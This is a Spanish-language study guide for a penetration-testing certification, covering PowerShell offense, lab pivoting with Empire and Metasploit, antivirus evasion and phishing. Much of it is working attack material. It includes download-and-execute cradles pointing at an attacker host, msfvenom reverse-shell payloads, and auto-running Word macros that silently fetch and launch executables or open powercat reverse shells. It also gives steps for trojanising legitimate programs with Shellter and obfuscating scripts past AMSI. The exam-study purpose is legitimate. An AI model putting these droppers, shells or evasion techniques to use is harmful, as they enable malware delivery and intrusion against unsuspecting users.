# eCPPTv3-Study-Guide (Work In Progress)

## Índice

- [01 - PowerShell for Pentesters](#01---powershell-for-pentesters)
- [02 - Client-Side Attacks](#02---client-side-attacks)
- [03 - Web Application Penetration Testing](#03---web-application-penetration-testing)
- [04 - Network Penetration Testing](#04---network-penetration-testing)
- [05 - System Security & x86 Assembly Fundamentals](#05---system-security--x86-assembly-fundamentals)
- [06 - Exploit Development: Buffer Overflows](#06---exploit-development-buffer-overflows)
- [07 - Privilege Escalation](#07---privilege-escalation)
- [08 - Lateral Movement & Pivoting](#08---lateral-movement--pivoting)
- [09 - Active Directory Penetration Testing](#09---active-directory-penetration-testing)
- [10 - Command & Control (C2/C&C)](#10---command--control-cc)
  
## 01 - PowerShell for Pentesters

### ~ PowerShell Fundamentals

```bash
- Viene preinstalado en todo Windows moderno (7 / 2008 R2+) → living-off-the-land: usamos herramientas nativas del sistema en lugar de subir binarios externos.
- Muchas organizaciones no monitorean activamente la actividad de PowerShell porque se considera una app "de confianza".
- Permite ejecutar/descargar código en memoria (evade AV/EDR basados en firmas de disco).
- Acceso directo a .NET Framework, COM y WMI → útil para enumeración, persistencia y post-explotación.
- Se pueden invocar funciones de DLLs de Windows y bypassear application whitelisting.
- Extensiones: .ps1 (scripts), .psm1 (módulos).

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe       # Ruta del ejecutable 64-bit
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe        # Ruta del ejecutable 32-bit

PS C:\> [Environment]::Is64BitProcess # Verificar si el proceso actual es 64-bit:

PS C:\> powershell /? # Opciones

# La política de ejecución de PowerShell determina qué scripts —si es que hay alguno— podemos ejecutar, y puede desactivarse fácilmente mediante los argumentos «Bypass» o «Unrestricted».
C:\> powershell.exe -ExecutionPolicy Bypass .\script.ps1
C:\> powershell.exe -ExecutionPolicy Unrestricted .\script.ps1

C:\> powershell.exe -WindowStyle Hidden .\script.ps1 # WindowStyle oculta la ventana de PowerShell cuando se utiliza con el argumento «hidden».
C:\> powershell.exe -Command Get-Process # El parámetro -Command se utiliza para especificar un comando o un bloque de script que se va a ejecutar.
C:\> powershell.exe -Command “& { Get-EventLog –LogName security }”
C:\> powershell.exe -EncodedCommand $encodedCommand # El parámetro -EncodedCommand se utiliza para ejecutar scripts o comandos codificados en Base64.
C:\> powershell.exe -NoProfile .\script.ps1 # No cargar perfiles (evita interferencias)
C:\> powershell.exe –Version 2 # Downgrade de versión (si está instalada)

# Cmdlet = mini-script nativo de PowerShell, formato Verbo-Sustantivo (ej. Get-Process, Invoke-Command).
# El output de un cmdlet es un objeto (no texto plano como en bash), lo que permite filtrar por propiedades específicas.

C:\> Get-Help <cmdlet>              # ayuda básica
C:\> Get-Help <cmdlet> -Full        # ayuda completa con parámetros
C:\> Get-Help <cmdlet> -Examples    # ejemplos de uso
C:\> Get-Help <cmdlet> -Online      # abre la doc web
C:\> Update-Help                    # actualiza archivos de ayuda locales

C:\> Get-Command                    # lista todos los cmdlets/alias/funciones disponibles
C:\> Get-Command -Name *Firewall*   # filtrar por nombre (wildcard)
C:\> powershell -Command Get-Process # Util para enumeración

Get-Help: https://technet.microsoft.com/enus/library/cc764318.aspx

PS C:\> Get-Process | Sort-Object -Unique | Select-Object ProcessName # Pipelining
PS C:\> Get-Process | Sort-Object -Unique | Select-Object ProcessName > uniq_procs.txt   # redirigir a archivo
PS C:\> Get-Process | Format-List *              # alias: fl
PS C:\> Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path, Id
PS C:\> Get-Alias -Definition Get-ChildItem # Encontrar el alias de un cmdlet
PS C:\> Get-WmiObject -class win32_operatingsystem | select -Property *
PS C:\> Get-WmiObject -class win32_operatingsystem | fl *
PS C:\> Get-WmiObject -class win32_service |Format-List *
PS C:\> Get-WmiObject -class win32_service |Sort-Object -Unique PathName | fl Pathname
PS C:\> Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\host_info.csv # Exportar archivo a CSV
PS C:\> cd HKLM:\  # Acceder a los subárboles del Registro de Windows

PS HKLM:\> cd .\SOFTWARE\Microsoft\Windows\CurrentVersion\
PS HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\> ls

PS C:\> Select-String -Path C:\users\user\Documents\*.txt -Pattern pass* # Búsqueda de credenciales / strings sensibles (muy relevante para post-explotación)
PS C:\> Get-Content C:\Users\user\Documents\passwords.txt
# Búsqueda recursiva en un directorio:
PS C:\> ls -r C:\users\user\Documents -File .txt | % { sls -Path $_ -Pattern pass }
# % = alias ForEach-Object | sls = alias Select-String | $_ = valor actual del pipeline
PS C:\> Get-Service
PS C:\> Get-Service “s*” | Sort-Object Status -Descending

# PowerShell Modules

- Archivo .psm1 que agrupa funcionalidades de PS en un solo archivo reutilizable.
- Tipos: Script Modules (.psm1), Binary Modules, Manifest Modules, Dynamic Modules.

PS C:\> Get-Module                    # listar módulos importados en la sesión actual
PS C:\> Get-Module -ListAvailable     # listar todos los módulos disponibles para importar
PS C:\> Import-Module .\module.psm1   # importar un módulo desde ruta local
PS C:\> Import-Module PowerSploit     # importar módulo por nombre (si está en PSModulePath)
PS C:\> $Env:PSModulePath             # ver rutas donde PS busca módulos
PS C:\> Get-Command -Module PowerSploit  # listar todos los cmdlets de un módulo importado
PS C:\> Get-Help Write-HijackDLL      # obtener ayuda de un cmdlet específico del módulo

# PowerSploit — framework ofensivo en PS
# Repo: https://github.com/PowerShellMafia/PowerSploit
# Instalar: descargar .zip → extraer → copiar carpeta a:
# C:\Users\user\Documents\WindowsPowerShell\Modules\PowerSploit\
# Nota: el AV lo va a detectar → crear exclusión de directorio antes de descargar

---

# PowerShell Scripts

# .ps1 = script de PowerShell (el "1" es el motor, no la versión)
PS C:\> .\script.ps1                          # ejecutar script en directorio actual
PS C:\> powershell.exe -ExecutionPolicy Bypass .\script.ps1  # bypass si hay restricción

PS C:\> $file = "users.txt"
PS C:\> Get-Content $file                     # alternativa rápida sin escribir .ps1

# Loop Statements — iterar colecciones, archivos, puertos, etc.
PS C:\> Get-Help about_Foreach
PS C:\> Get-Help about_For
PS C:\> Get-Help about_While
PS C:\> Get-Help about_Do

# foreach — iterar una colección de objetos
PS C:\> $services = Get-Service
PS C:\> foreach ($service in $services) { $service.Name }

# ForEach-Object — equivalente con pipeline (% es alias)
PS C:\> Get-Service | ForEach-Object { $_.Name }
PS C:\> Get-Service | % { $_.Name }           # forma corta con alias

# Where-Object — filtrar objetos por propiedad
PS C:\> Get-ChildItem C:\PowerShell\ | Where-Object { $_.Name -match "xls" }

# TCP Port Scanner one-liner
PS C:\> $ports=(80,443,8080); $ip="192.168.1.1"; foreach ($port in $ports) { try { $socket = New-Object System.Net.Sockets.TcpClient($ip,$port); } catch {}; if ($socket -eq $null) { echo "$ip:$port - Closed" } else { echo "$ip:$port - Open"; $socket = $null } }

---

# PowerShell Objects

# Los cmdlets devuelven objetos .NET, no texto plano → se pueden filtrar por propiedades y manipular con métodos.

PS C:\> Get-Process | Get-Member -MemberType Method   # ver métodos disponibles de un objeto
PS C:\> Get-Process -Name "firefox" | Kill            # llamar método Kill sobre el objeto proceso

# Crear objetos .NET con New-Object — muy útil para descargas y conexiones
PS C:\> $webclient = New-Object System.Net.WebClient
PS C:\> $payload_url = "https://attacker_host/payload.exe"
PS C:\> $file = "C:\ProgramData\payload.exe"
PS C:\> $webclient.DownloadFile($payload_url, $file)   # descargar payload a disco

# Alternativa más corta con IEX (Invoke-Expression) — ejecuta en memoria sin tocar disco
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://attacker_host/script.ps1')
# ↑ Importante para evasión de AV: nunca escribe el script en disco

```
### ~ PowerShell for Pentesting

```bash
# CONCEPTOS CLAVE
# Pivoting: usar una máquina comprometida como puente hacia redes internas
# C2 (Command & Control): servidor que maneja agentes en máquinas comprometidas
# Listener: puerto en Kali que espera conexiones entrantes de agentes
# Stager: código PS que se ejecuta en la víctima y la hace conectarse al listener
# Agente: proceso activo en la víctima conectado al C2
# autoroute: le dice a MSF cómo enrutar tráfico por una sesión activa
# SOCKS proxy: tuneliza tráfico del browser por la sesión Meterpreter

# Leveraging PowerShell During Exploitation
10.4.30.114    demo.ine.local -> acceso directo
10.4.20.133    fileServer.ine.local -> pivotar
nmap -p- demo.ine.local # enumeracion
nmap -sV -p 4983 demo.ine.local # verificamos servicio
# Al ingresar al servicio HTTP encontramos /user:Administrator abc_123321!@#
smbexec.py 'Administrator:abc_123321!@#'@demo.ine.local # Probamos acceso con smb

# Empezamos powershell-empire
powershell-empire server # servidor en una nueva terminal
powershell-empire client # cliente en otra terminal
(Empire) > uselistener http # área de configuración del oyente http
set Host 10.10.42.2 # ip de mi kali
set Port 8888 # puerto de mi kali
#  Ahora que nuestro oyente está despierto y "escuchando", querremos generar un "stager" El "stager" es el código que ejecutaremos en nuestro objetivo una vez que lo generemos. Podemos generar un stager saliendo primero del área "Listener" y regresando a la sección "main" ejecutando el comando "main" y luego escribiendo el comando "usestager". Si escribimos "usestager" " Deberíamos obtener una lista de todos los escenarios disponibles.
(Empire) > usestager multi/launcher # 
(Empire: usestager/multi/launcher) > set Listener http # el nombre de nuestro oyente era "http"
(Empire: usestager/multi/launcher) > execute #  Empire genera nuestro código de stager
#En este punto, Empire ha generado un comando codificado en PowerShell. Luego copiamos y pegamos el código PowerShell generado por Empire en nuestro shell smbexec
# Si ahora escribimos el comando "agentes" dentro de Empire, podemos confirmar que nuestro agente ha llamado a casa a Empire C2 y actualmente está activo a través del proceso "powershell" en el sistema de destino
[+] New agent 631AN7HD checked in
(Empire: agents) > interact 631AN7HD # Interactar con el agente 
(Empire: 631AN7HD) > usemodule powershell/situational_awareness/host/computerdetails # Usar modulos (como en msfconsole)
usemodule powershell/situational_awareness/network/portscan
set Hosts 10.4.20.133 # la maquina faltante
msfconsole # en otra terminal
use exploit/multi/script/web_delivery
set target 2
set SRVHOST 10.10.42.2 # Esta es la dirección IP de la máquina Kali.
set LHOST 10.10.42.2
set payload windows/meterpreter/reverse_tcp
exploit # se genera http://10.10.42.2:8080/E8tlUIOl
usemodule powershell/code_execution/invoke_metasploitpayload # De vuelta en nuestro Empire C2, para pasar nuestro agente a metasploit, necesitamos cargar el módulo "invoke_metasploitpayload".
usemodule powershell/code_execution/invoke_metasploitpayload
set URL http://10.10.42.2:8080/E8tlUIOl
execute
# autoroute — agrega rutas en la tabla de Metasploit para que el tráfico
# hacia la red interna (10.4.20.0/24) pase por la sesión Meterpreter de demo
# sin esto, Metasploit no sabe cómo llegar a fileserver
use post/multi/manage/autoroute
set SESSION 1
run
# socks_proxy — levanta un proxy SOCKS5 en Kali en el puerto 1080
# permite tunelizar tráfico del browser por la sesión, simulando estar en la red interna
use auxiliary/server/socks_proxy
set SRVHOST 10.10.42.2
run
# A continuación, después de configurar el módulo proxy Socks, debemos configurar nuestro navegador para usar nuestro proxy Socks5.
# Luego seleccione Configuración de red para abrir la configuración de conexión. Seleccione SOCKS Host y proporcione la dirección IP de la máquina Kali y el puerto como 1080.
# Abra otra pestaña en Firefox. Deberíamos poder navegar a la máquina fileserver.ine.local y observamos que BadBlue Enterprise Edition se está ejecutando en la máquina remota.

search badblue # en metasploit
use 1
set RHOSTS fileserver.ine.local
set PAYLOAD windows/meterpreter/bind_tcp
exploit
pwd
cd ../../../
pwd
ls
cat flag.txt
```

#### AV Evasion with Shellter

- Encoding: Convierte el payload a otro formato — por ejemplo Base64 — para que los bytes sean diferentes. El problema es que los AV modernos también conocen los encoders más comunes como shikata_ga_nai de Metasploit, así que solos ya no funcionan bien. Útil como capa adicional, no como técnica única.
- Obfuscation: Cambia la apariencia del código sin cambiar lo que hace — renombra variables, agrega código basura, parte strings, cambia el orden. Muy usado en PowerShell porque el AV analiza el texto del script antes de ejecutarlo.
* Invoke-Mimikatz # Original — detectado
* $a = "Invoke"; $b = "-Mimikatz"; &($a+$b) # Obfuscado — más difícil de detectar
- Packing: Comprime o empaqueta el ejecutable y agrega un "unpacker" que lo descomprime en memoria al ejecutarse. El AV ve el ejecutable comprimido y no reconoce el payload adentro. UPX es el packer más conocido aunque ya está bastante detectado.
- Crypters: Similar al packing pero en vez de comprimir, cifra el payload. Al ejecutarse, descifra el payload en memoria y lo corre. Es más efectivo que encoding o packing porque el payload cifrado es básicamente ruido aleatorio para el AV. Los crypters más efectivos son FUD (Fully UnDetectable) y suelen ser de pago o privados.
- Shellter: Es una herramienta que combina varias de estas técnicas de forma automática. Toma un ejecutable legítimo de Windows (como putty.exe) e inyecta tu payload dentro de él, modificando el flujo de ejecución para que el exe legítimo funcione normal pero también ejecute tu payload. Es efectivo porque el AV ve un ejecutable conocido y confiable.

```bash
# AV EVASION CON SHELLTER
# Shellter inyecta un payload malicioso dentro de un ejecutable legítimo de Windows
# El AV ve el exe legítimo (putty.exe, wincmd.exe, etc.) y no detecta el payload adentro
# Requiere wine para correr en Kali (es una herramienta de Windows)

# Instalación
sudo dpkg --add-architecture i386   # habilitar arquitectura 32-bit (shellter es x86)
sudo apt-get update
sudo apt-get install wine32 -y
sudo apt-get install shellter -y

# Uso (desde la ruta donde está shellter.exe)
sudo wine shellter.exe

> A               # Modo automático (vs Manual que da más control pero es más complejo)
> PE Target:      # Ruta del ejecutable LEGÍTIMO que vamos a infectar (ej: /root/putty.exe)
                  # Importante: debe ser un exe de 32-bit
> Stealth Mode: Y # El exe legítimo sigue funcionando normal — no levanta sospechas
> L               # Usar payload de la lista predefinida (meterpreter, shell, etc.)
> [elegir opción] # Típicamente meterpreter_reverse_tcp
> LHOST: <ip atacante>
> LPORT: <puerto>

# Resultado: el exe original queda modificado con el payload inyectado
# Al ejecutarlo en la víctima → funciona el programa legítimo + se abre la reverse shell
# En Kali tener el listener activo antes de ejecutar en la víctima:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <puerto>; run"
```

#### Obfuscating PowerShell Code

```bash
# OBFUSCATING POWERSHELL CODE CON INVOKE-OBFUSCATION
# Los AV/EDR analizan scripts PS antes de ejecutarlos (via AMSI)
# Invoke-Obfuscation modifica la estructura del código para evadir esa detección
# sin cambiar lo que el script hace

# Instalación de PowerShell en Kali
sudo apt-get install powershell -y

# Uso
pwsh                                    # abrir PowerShell en Kali
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1 # cargar el módulo
cd ..
Invoke-Obfuscation                      # iniciar la herramienta

# Dentro de Invoke-Obfuscation:
SET SCRIPTPATH <ruta del .ps1>  # script que queremos ofuscar
AST                             # modo Abstract Syntax Tree — ofusca la estructura
                                # lógica del código, no solo el texto
                                # es el modo más efectivo contra AMSI
ALL                             # aplicar todas las técnicas de ofuscación AST
1                               # confirmar — devuelve el script ofuscado

# Otros modos disponibles (menos efectivos que AST):
# TOKEN    — ofusca partes individuales (strings, comandos)
# STRING   — ofusca strings dentro del código
# ENCODING — codifica el script completo
# COMPRESS — comprime y ofusca

# Output: script .ps1 con el mismo comportamiento pero irreconocible para el AV
```
### ~ SkillCheck CTF1

```bash
server.prod.local (10.4.23.70)  -> directo
web.prod.local (10.4.19.58) -> pivote

# nmap -sV -p 135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49681 10.4.23.70                                                                              
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


```

## 02 - Client-Side Attacks

### ~ Client-Side Attacks

#### Qué son
- Ataques que explotan el eslabón más débil: los empleados/usuarios
- No requieren acceso directo al sistema — se entregan via email, USB, sitios comprometidos
- Más peligrosos que server-side porque no necesitan vulnerabilidades en servidores

#### Flujo general
Reconocimiento → Identificar objetivo → Desarrollar payload
→ Preparar entrega → Entregar payload → Ejecución → Post-explotación

#### Ventajas para el atacante
- Superficie de ataque enorme (todos los endpoints)
- Explota comportamiento humano, no solo software
- Endpoints tienen menos controles que servidores
- Facilita movimiento lateral una vez dentro

#### Client-Side vs Server-Side
- Client-Side: apunta a usuarios (phishing, macros, HTA, drive-by downloads)
- Server-Side: apunta a servidores (SQLi, RCE, SSRF, misconfigs)
  
### ~ Reconnaissance

#### Objetivo
- Identificar info del objetivo ANTES de desarrollar el payload
- Adaptar el ataque según el entorno del target (browser, OS, plugins)

#### Client-Side Information Gathering
- Fuentes OSINT: LinkedIn, redes sociales, web corporativa, job postings
- Job postings revelan tecnologías usadas internamente (ej: "se requiere experiencia en Office 365")
- Herramientas: theHarvester, Maltego, Shodan

#### Client Fingerprinting
- Identificar browser, versión, OS, plugins, resolución del objetivo
- Útil para adaptar el payload al entorno específico del target
- Herramientas: fingerprintjs, grabify.link (tracking links)
- Técnica: enviar un link al objetivo y capturar info del request HTTP
  - User-Agent → browser y OS
  - IP → geolocalización
  - Headers → configuración del cliente

### ~ Social Engineering

#### Qué es
- Manipulación psicológica para que el objetivo realice una acción
- No explota software — explota comportamiento humano

#### Técnicas principales
- Phishing — email masivo con payload o link malicioso
- Spear Phishing — phishing dirigido a una persona específica (más efectivo)
- Vishing — phishing por voz/llamada
- Smishing — phishing por SMS
- Pretexting — crear una historia creíble para justificar la interacción

#### Pretexting
- Crear un escenario falso convincente para que el objetivo confíe
- Ejemplos: hacerse pasar por IT, RRHH, proveedor, banco
- Elementos clave: urgencia, autoridad, confianza

#### GoPhish — Phishing Campaigns
* Instalación
wget https://github.com/gophish/gophish/releases/...
chmod +x gophish
./gophish

* Panel admin en https://localhost:3333 (credenciales por defecto admin:gophish)

#### Componentes de una campaña en GoPhish
1. Sending Profile — servidor SMTP para enviar los emails
2. Landing Page — página falsa que clona el sitio legítimo
3. Email Template — el email de phishing con el link a la landing page
4. Users & Groups — lista de objetivos
5. Campaign — une todo y lanza el ataque

#### Métricas que trackea GoPhish
- Email enviado
- Email abierto
- Link clickeado
- Credenciales enviadas (si hay formulario)

### ~ Development & Weaponization

#### Resource Development & Weaponization

- Fase del ataque donde el atacante prepara los recursos necesarios para el ataque
- En pentesting/red team: desarrollar payloads, infraestructura y herramientas antes de la entrega
- Corresponde a la fase "Weaponization" del Cyber Kill Chain

~ Cyber Kill Chain (contexto)
Reconocimiento → Weaponization → Entrega → Explotación
→ Instalación → C2 → Acciones sobre objetivos

~ MITRE ATT&CK Framework
- Base de conocimiento de tácticas y técnicas usadas por atacantes reales
- Útil para mapear ataques a técnicas conocidas y documentar hallazgos
- URL: https://attack.mitre.org

~ Estructura
- Tácticas: el "qué" — objetivo del atacante (ej: Initial Access, Execution, Persistence)
- Técnicas: el "cómo" — método específico (ej: T1566 Phishing, T1059 Command Scripting)
- Sub-técnicas: variantes específicas (ej: T1566.001 Spearphishing Attachment)

~ Técnicas relevantes para Client-Side Attacks
- T1566.001 — Spearphishing Attachment
- T1566.002 — Spearphishing Link
- T1059.001 — PowerShell
- T1059.005 — VBA Macros
- T1027     — Obfuscated Files or Information
- T1204.002 — User Execution: Malicious File

~ Por qué importa en pentesting
- Los reportes profesionales mapean cada hallazgo a su técnica ATT&CK
- Permite al cliente entender qué tácticas reales emuló el pentest
- Los blue teams usan ATT&CK para detectar y responder ataques

~ Resource Development
- Registrar dominios para phishing (typosquatting: rnicrosof.com vs microsoft.com)
- Configurar infraestructura C2
- Obtener/crear certificados SSL para parecer legítimo
- Crear cuentas falsas en redes sociales para pretexting
- Comprometer infraestructura de terceros para usarla como relay

~ Weaponization
- Combinar un payload malicioso con un vector de entrega legítimo
- Objetivo: que el archivo/link parezca inofensivo pero ejecute código malicioso
- Vectores comunes:
  - Documentos Office con macros (Word, Excel)
  - PDFs con JavaScript embebido
  - HTML Applications (.hta)
  - Archives (.zip, .iso) con payloads adentro
  - Links a páginas con drive-by downloads

~ Payload vs Exploit
- Exploit: código que aprovecha una vulnerabilidad
- Payload: código que se ejecuta DESPUÉS del exploit (reverse shell, dropper, etc.)
- En client-side attacks el "exploit" suele ser ingeniería social,
  no una vulnerabilidad técnica

~ Staged vs Stageless Payloads
- Stageless: payload completo en un archivo — más grande, más detectable
- Staged: payload pequeño (stager) que descarga el payload real desde C2
  — más sigiloso, requiere conexión a internet desde la víctima

#### VBA Macro Fundamentals

~ Qué es VBA
- Visual Basic for Applications — lenguaje de scripting integrado en Microsoft Office
- Permite automatizar tareas en Word, Excel, PowerPoint, Access
- En pentesting: vector de initial access via documentos maliciosos

~ Por qué es relevante para red team
- Los documentos Office son vectores de entrega confiables y comunes
- Los usuarios confían en archivos .docx, .xlsx, etc.
- Las macros pueden ejecutar comandos del sistema, descargar payloads, abrir conexiones

~ Formatos que soportan macros
- .docm — Word con macros
- .xlsm — Excel con macros
- .doc  — formato legacy, también soporta macros
- Nota: .docx NO soporta macros

#### VBA Macro Development

```bash
# Habilitar macros en Word
# Por defecto está deshabilitado — ir a:
# Archivo → Opciones → Centro de confianza → Configuración del centro de confianza
# → Configuración de macros → Habilitar todas las macros

# Habilitar pestaña Desarrollador:
# Archivo → Opciones → Personalizar cinta → activar "Desarrollador"
# O directo: Alt+F11 para abrir el editor VBA

# Entry Points — se ejecutan automáticamente al abrir el documento
Sub AutoOpen()
    MsgBox "Hello"
End Sub

Sub Document_Open()   ' Alternativa a AutoOpen, mismo efecto
    MsgBox "Hello"
End Sub

# Ejecutar comandos del sistema
Shell "cmd.exe /c whoami"
Shell "powershell.exe -Command Get-Process"

# WScript.Shell — más control sobre la ejecución
Dim shell As Object
Set shell = CreateObject("WScript.Shell")

shell.Run "cmd.exe /c whoami > C:\output.txt"

# Argumentos de Shell.Run
# shell.Run "programa", [WindowStyle], [WaitOnReturn]
# WindowStyle:
# 0 = oculto (más usado en pentesting — no levanta sospechas)
# 1 = normal
# 2 = minimizado
# 3 = maximizado
# WaitOnReturn: True = espera a que termine | False = continúa sin esperar

shell.Run "calc.exe", 3         ' maximizado
shell.Run "notepad.exe", 0      ' oculto
shell.Run "cmd.exe /c payload.exe", 0, True

# WScript — Windows Script Host
# Permite interactuar con el sistema a nivel más profundo

Dim wscript As Object
Set wscript = CreateObject("WScript.Shell")

wscript.Popup "Mensaje al usuario"                        ' mostrar mensaje
wscript.ExpandEnvironmentStrings("%USERNAME%")            ' variables de entorno
wscript.ExpandEnvironmentStrings("%TEMP%")
wscript.Run "notepad.exe"
wscript.Run "powershell.exe -ExecutionPolicy Bypass -File C:\script.ps1"

# Leer registro de Windows
Dim version As String
version = shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
MsgBox version    ' muestra versión de Windows

# Puntos clave para el examen
# - AutoOpen() y Document_Open() son los entry points más usados
# - Shell y WScript.Shell son los dos métodos para ejecutar comandos
# - WindowStyle 0 oculta la ventana — importante para evasión
# - Las macros requieren que el usuario habilite el contenido al abrir el doc
```

#### Weaponizing VBA Macros with MSF

```bash
# Generar payload VBA con msfvenom
msfvenom --list formats                         # ver todos los formatos disponibles

# Formato vba-exe — genera dos partes:
# 1. Código VBA → va al editor de macros en Word (Alt+F11)
# 2. Datos HEX → van pegados directamente en el cuerpo del documento Word
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
    LHOST=<ip_kali> LPORT=4444 -f vba-exe

# Formato vba-psh — genera solo código VBA (PowerShell dropper)
# Todo va al editor de macros, no requiere pegar nada en el documento
# Más limpio y más usado en la práctica
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
    LHOST=<ip_kali> LPORT=4444 -f vba-psh

# Diferencia clave:
# vba-exe → payload embebido en hex dentro del doc (más pesado, más detectable)
# vba-psh → payload descargado via PowerShell en memoria (más sigiloso)

# Configurar listener en Metasploit
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip_kali>
set LPORT 4444
run

# Flujo completo
# 1. Generar payload con msfvenom -f vba-psh
# 2. Copiar código VBA al editor de macros del documento Word
# 3. Guardar como .docm (Word con macros)
# 4. Levantar listener en MSF
# 5. Víctima abre el doc y habilita macros → sesión Meterpreter en Kali
```
#### VBA Powershell Dropper

```bash
# Qué es un Dropper
# Payload que NO genera acceso inicial por sí solo
# Su función es descargar y ejecutar el payload real desde un servidor controlado
# Ventaja: el documento malicioso es pequeño y menos detectable
# El payload real (shell.exe) solo toca la máquina víctima en memoria o disco

# Flujo completo
# 1. Generar payload .exe con msfvenom
# 2. Servirlo via HTTP desde Kali
# 3. El dropper VBA en el doc descarga y ejecuta el .exe en la víctima
# 4. El .exe se conecta al listener en Kali → sesión Meterpreter

# Paso 1 — Generar payload
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
    LHOST=<ip_kali> LPORT=4444 -f exe > shell.exe

# Paso 2 — Servir el payload via HTTP
sudo python3 -m http.server 8080

# Paso 3 — Listener en Metasploit
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip_kali>
set LPORT 4444
run

# Paso 4 — Macro VBA en el documento Word
Sub AutoOpen()
    dropper
End Sub

Sub Document_Open()
    dropper
End Sub

Sub dropper()
    Dim url As String        ' URL donde está el payload
    Dim psScript As String   ' comando PS que descarga y ejecuta el payload

    url = "http://<ip_kali>:8080/shell.exe"

    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\Admin\file.exe"";" & vbCrLf & _
               "Start-Process -FilePath ""C:\Users\Admin\file.exe"""

    ' ExecutionPolicy Bypass — bypass de restricciones PS
    ' WindowStyle Hidden — oculta la ventana de PS
    ' vbHide — oculta también la ventana de cmd
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
End Sub
```
#### VBA Reverse Shell Macro with Powercat

```bash
# Qué es Powercat
# Script de PowerShell (netcat "nativo" en PS) que permite crear reverse/bind shells
# Repo oficial: https://github.com/besimorhino/powercat

# Flujo
# 1. Clonar powercat y servirlo via HTTP
# 2. La macro VBA descarga powercat.ps1 en memoria (IEX) y lo ejecuta
# 3. Powercat abre conexión reversa hacia el listener (nc) en Kali

# Paso 1 — Clonar powercat
cd Desktop
git clone https://github.com/besimorhino/powercat.git

# Paso 2 — Servir el script via HTTP
cd powercat
sudo python3 -m http.server 8080

# Paso 3 — Listener netcat
nc -nvlp 1337

# Paso 4 — Macro VBA en el documento Word
Sub AutoOpen()
    powercat
End Sub
Sub Document_Open()
    powercat
End Sub
Sub powercat()
    Dim url As String
    Dim psScript As String
    url = "http://<ip_kali>:8080/powercat.ps1"
    ' IEX descarga y ejecuta el script en memoria (sin tocar disco)
    ' -c LHOST -p LPORT -e cmd → reverse shell ejecutando cmd.exe
    psScript = "IEX (New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c <ip_kali> -p 1337 -e cmd"
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
End Sub

# Variante 2 — Powercat con generación previa del comando (pwsh -c)

# Diferencia clave con la variante anterior:
# En vez de escribir el psScript "a mano" dentro de la macro,
# se genera el comando completo desde Kali con pwsh -c,
# se redirige la salida a un archivo (reverse-shell.txt),
# y de ahí se copia/decodifica para meterlo en la macro VBA.
# Sirve para verificar que la sintaxis del comando esté bien
# antes de pegarla en el VBA (evita errores de comillas/escaping).

LHOST=<ip_kali>
LPORT=1337

# Genera el comando y lo guarda en un txt para revisarlo
pwsh -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c $LHOST -p $LPORT -e cmd.exe -g" > /tmp/reverse-shell.txt

# Servir powercat.ps1 via HTTP
sudo python3 -m http.server 8080

# Listener
nc -nvlp 1337

# Macro VBA (mismo patrón que la variante 1)
Sub AutoOpen()
    powercat
End Sub
Sub Document_Open()
    powercat
End Sub
Sub powercat()
    Dim url As String
    Dim psScript As String
    url = "http://<ip_kali>:8080/powercat.ps1"
    psScript = "IEX (New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c <ip_kali> -p 1337 -e cmd.exe -g"
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
End Sub
```

#### Using ActiveX Controls for Macro Execution

```bash
# Qué es ActiveX
# Conjunto de tecnologías Microsoft para crear contenido interactivo en documentos Office
# Permite insertar controles (botones, campos de texto, etc.) que ejecutan macros
# Ventaja para evasión: evita usar AutoOpen() y Document_Open()
# que son los entry points más detectados por AV

# Por qué es útil en pentesting
# Los AV buscan activamente Sub AutoOpen() y Sub Document_Open()
# ActiveX permite ejecutar macros mediante interacción del usuario con el control
# (click, foco, hover) — menos sospechoso para el AV

# Ejemplo 1 — Botón ActiveX
# Insertar → Controles → Botón → editar macro del botón
Sub CommandButton1_Click()    ' se ejecuta al hacer click en el botón
    MsgBox "ActiveX PoC"
End Sub

# Ejemplo 2 — Microsoft InkEdit Control
# Insertar → Más controles → Microsoft InkEdit Control
# El control no muestra nada visible — útil para ocultarlo en el documento

Sub InkEdit1_GotFocus()       ' se ejecuta cuando el control recibe el foco
    MsgBox "ActiveX PoC"      ' el usuario ni sabe que activó algo
End Sub

# Ejemplo 3 — Combinado con payload real
# En lugar de AutoOpen(), el payload se dispara via ActiveX

Sub calc()
    Dim payload As String
    payload = "calc.exe"
    CreateObject("Wscript.Shell").Run payload, 1
End Sub

Sub InkEdit1_GotFocus()       ' cuando el control recibe foco → ejecuta payload
    calc
End Sub

# Puntos clave para el examen
# - ActiveX es una alternativa a AutoOpen/Document_Open para evadir AV
